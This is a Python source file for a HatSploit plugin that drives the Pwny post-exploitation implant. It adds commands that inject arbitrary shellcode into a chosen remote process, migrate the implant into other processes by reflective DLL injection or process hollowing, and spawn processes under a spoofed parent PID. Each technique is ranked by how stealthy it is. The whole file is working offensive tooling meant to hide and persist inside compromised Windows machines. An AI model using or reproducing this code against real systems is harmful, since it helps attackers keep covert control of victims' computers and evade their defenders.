"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import time

from pwny import Pwny
from pwny.api import *
from pwny.types import *

from badges.cmd import Command

from hatsploit.lib.core.plugin import Plugin


# ---- inject_shellcode tags/types (API_CALL) ----

INJECT_SHELLCODE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
TLV_TYPE_INJECT_SC_TECHNIQUE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)

# ---- migrate_load tags/types (API_CALL + 1) ----

MIGRATE_LOAD = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
TLV_TYPE_INJECT_TECHNIQUE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
TLV_TYPE_MIGRATE_ERROR = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)

# ---- ppid_spawn tags/types (API_CALL + 2) ----

PPID_SPAWN = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)
TLV_TYPE_PPID_PARENT = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 3)
TLV_TYPE_PPID_CMD = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 4)
TLV_TYPE_PPID_CHILD = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 5)

# ---- Injection techniques (must match inject_tech.h) ----

INJECT_TECH_CRT = 0
INJECT_TECH_APC = 1
INJECT_TECH_HIJACK = 2
INJECT_TECH_HOLLOW = 3
INJECT_TECH_DEFAULT = INJECT_TECH_HIJACK

INJECT_TECHNIQUE_MAP = {
    'hijack': INJECT_TECH_HIJACK,
    'apc': INJECT_TECH_APC,
    'crt': INJECT_TECH_CRT,
    'hollow': INJECT_TECH_HOLLOW,
}

INJECT_TECHNIQUE_NAMES = {
    INJECT_TECH_CRT: 'CreateRemoteThread (noisy)',
    INJECT_TECH_APC: 'QueueUserAPC (moderate)',
    INJECT_TECH_HIJACK: 'Thread Hijack (stealthy)',
    INJECT_TECH_HOLLOW: 'Process Hollow (stealthiest)',
}


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Inject Plugin",
            'Plugin': "inject",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Inject shellcode, migrate into another process, "
                "or spawn with a spoofed parent PID."
            ),
        })

        self.commands = [
            Command({
                'Category': "exploit",
                'Name': "inject",
                'Description': "Inject shellcode into a remote process.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "Target process ID.",
                            'type': int,
                        }
                    ),
                    (
                        ('-f', '--file'),
                        {
                            'help': "Local file containing raw shellcode.",
                            'metavar': 'PATH',
                        }
                    ),
                    (
                        ('-x', '--hex'),
                        {
                            'help': "Shellcode as hex string (e.g. 90909090cc).",
                            'metavar': 'HEX',
                        }
                    ),
                    (
                        ('-t', '--technique'),
                        {
                            'help': "Injection technique: hijack (default, stealthy), "
                                    "apc (moderate), crt (legacy, noisy).",
                            'metavar': 'TECH',
                            'choices': ['hijack', 'apc', 'crt'],
                            'default': 'hijack',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "evasion",
                'Name': "migrate",
                'Description': "Migrate into another process via reflective DLL injection.",
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "Target process ID to migrate into "
                                    "(not required for hollow technique).",
                            'type': int,
                            'nargs': '?',
                            'default': 0,
                        }
                    ),
                    (
                        ('-t', '--technique'),
                        {
                            'help': "Injection technique: hijack (default, stealthy), "
                                    "apc (moderate), crt (legacy, noisy), "
                                    "hollow (stealthiest, spawns own process).",
                            'metavar': 'TECH',
                            'choices': list(INJECT_TECHNIQUE_MAP.keys()),
                            'default': 'hijack',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "evasion",
                'Name': "ppid_spoof",
                'Description': "Spawn a process with a spoofed parent PID.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-p', '--parent'),
                        {
                            'help': "Parent PID to spoof.",
                            'type': int,
                            'required': True,
                        }
                    ),
                    (
                        ('-c', '--cmd'),
                        {
                            'help': "Command line to execute (default: notepad.exe).",
                            'default': 'notepad.exe',
                        }
                    ),
                ]
            }),
        ]

    # ---- inject handler ----

    def inject(self, args):
        if args.file:
            try:
                with open(args.file, 'rb') as f:
                    shellcode = f.read()
            except Exception as e:
                self.print_error(f"Failed to read file: {e}")
                return

        elif args.hex:
            try:
                shellcode = bytes.fromhex(args.hex)
            except ValueError:
                self.print_error("Invalid hex string!")
                return
        else:
            self.print_error("Specify shellcode via -f/--file or -x/--hex")
            return

        if len(shellcode) == 0:
            self.print_error("Shellcode is empty!")
            return

        technique = INJECT_TECHNIQUE_MAP.get(args.technique, INJECT_TECH_DEFAULT)
        tech_name = INJECT_TECHNIQUE_NAMES.get(technique, args.technique)

        self.print_process(
            f"Injecting {len(shellcode)} bytes into PID {args.pid} "
            f"[{tech_name}]..."
        )

        result = self.session.send_command(
            tag=INJECT_SHELLCODE,
            plugin=self.plugin,
            args={
                TLV_TYPE_PID: args.pid,
                TLV_TYPE_BYTES: shellcode,
                TLV_TYPE_INJECT_SC_TECHNIQUE: technique,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Injection failed! Check PID exists and you have "
                "sufficient privileges (try getsystem first)."
            )
            return

        self.print_success(f"Shellcode injected and executing in PID {args.pid}.")

    # ---- migrate handler ----

    def migrate(self, args):
        technique = INJECT_TECHNIQUE_MAP.get(args.technique, INJECT_TECH_DEFAULT)
        tech_name = INJECT_TECHNIQUE_NAMES.get(technique, args.technique)
        is_hollow = (technique == INJECT_TECH_HOLLOW)

        if not is_hollow and not args.pid:
            self.print_error(
                "PID is required for non-hollow techniques. "
                "Use -t hollow to spawn a new process."
            )
            return

        result = self.session.send_command(tag=PROCESS_GET_PID)
        curr_pid = result.get_int(TLV_TYPE_PID)

        if is_hollow:
            self.print_process(
                f"Migrating from PID {curr_pid} into new process "
                f"[{tech_name}]..."
            )
        else:
            self.print_process(
                f"Migrating from PID {curr_pid} to PID {args.pid} "
                f"[{tech_name}]..."
            )

        library = Pwny(target='x86_64-w64-mingw32').to_binary('dll')

        if not library:
            self.print_error("DLL binary not found for target architecture!")
            return

        self.print_process(
            f"Injecting DLL ({len(library)} bytes)..."
        )

        cmd_args = {
            TLV_TYPE_BYTES: library,
            TLV_TYPE_INJECT_TECHNIQUE: technique,
        }

        if args.pid:
            cmd_args[TLV_TYPE_PID] = args.pid

        result = self.session.send_command(
            tag=MIGRATE_LOAD,
            plugin=self.plugin,
            args=cmd_args,
        )

        status = result.get_int(TLV_TYPE_STATUS)

        if status == TLV_STATUS_QUIT:
            self.print_process("Migration initiated, reconnecting...")

            time.sleep(1)

            self.session.open(self.session.channel.client.client)
            self.session.channel.secure = False

            target_desc = "new process" if is_hollow else f"PID {args.pid}"
            self.print_success(
                f"Successfully migrated to {target_desc}!"
            )
        else:
            error_msg = result.get_string(TLV_TYPE_MIGRATE_ERROR)
            if error_msg:
                self.print_error(f"Migration failed: {error_msg}")
            elif is_hollow:
                self.print_error(
                    "Migration failed! Could not spawn or redirect "
                    "the hollow host process."
                )
            else:
                self.print_error(
                    "Migration failed! Ensure the target PID exists, matches "
                    "architecture (x64->x64), and you have sufficient privileges."
                )

    # ---- ppid_spoof handler ----

    def ppid_spoof(self, args):
        self.print_process(
            f"Spawning '{args.cmd}' under parent PID {args.parent}..."
        )

        result = self.session.send_command(
            tag=PPID_SPAWN,
            plugin=self.plugin,
            args={
                TLV_TYPE_PPID_PARENT: args.parent,
                TLV_TYPE_PPID_CMD: args.cmd,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to spawn process! Ensure the parent PID exists "
                "and you have PROCESS_CREATE_PROCESS access."
            )
            return

        child_pid = result.get_int(TLV_TYPE_PPID_CHILD)
        self.print_success(
            f"Process spawned (PID {child_pid}) under parent {args.parent}."
        )

    def load(self):
        pass
